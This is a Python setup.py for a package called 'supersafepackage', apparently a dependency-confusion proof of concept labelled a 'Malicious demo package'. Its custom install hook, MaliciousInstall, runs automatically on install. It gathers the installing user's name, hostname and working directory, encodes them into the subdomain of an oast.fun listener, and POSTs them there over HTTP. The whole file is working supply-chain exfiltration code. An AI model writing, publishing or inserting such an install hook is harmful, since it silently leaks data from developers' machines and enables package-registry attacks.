import os
import getpass
import socket
import json
import base64
import http.client
from setuptools import setup, find_packages
from setuptools.command.install import install

# Encode using base64 URL-safe
def b64safe(data):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')

class MaliciousInstall(install):
    def run(self):
        user = getpass.getuser()
        host = socket.gethostname()
        cwd = os.getcwd()

        payload = {
            "cwd": cwd,
            "package": "supersafepackage",
            "version": "4.0.0",
            "hostname": host,
            "whoami": user
        }

        data = json.dumps(payload)
        body = data.encode()

        encoded_host = b64safe(host)
        encoded_user = b64safe(user)

        listener_domain = f"{encoded_host}.{encoded_user}.dbwgovzrtoclyqrugbqebvde685mxqq1g.oast.fun"

        try:
            conn = http.client.HTTPConnection(listener_domain, 80)
            conn.request("POST", "/", body, {
                "Content-Type": "application/json",
                "Content-Length": str(len(body))
            })
            conn.close()
        except Exception as e:
            print(f"[!] Error sending data: {e}")

        install.run(self)

setup(
    name='supersafepackage',
    version='4.0.0',
    description='Malicious demo package',
    packages=find_packages(),
    cmdclass={'install': MaliciousInstall},
)
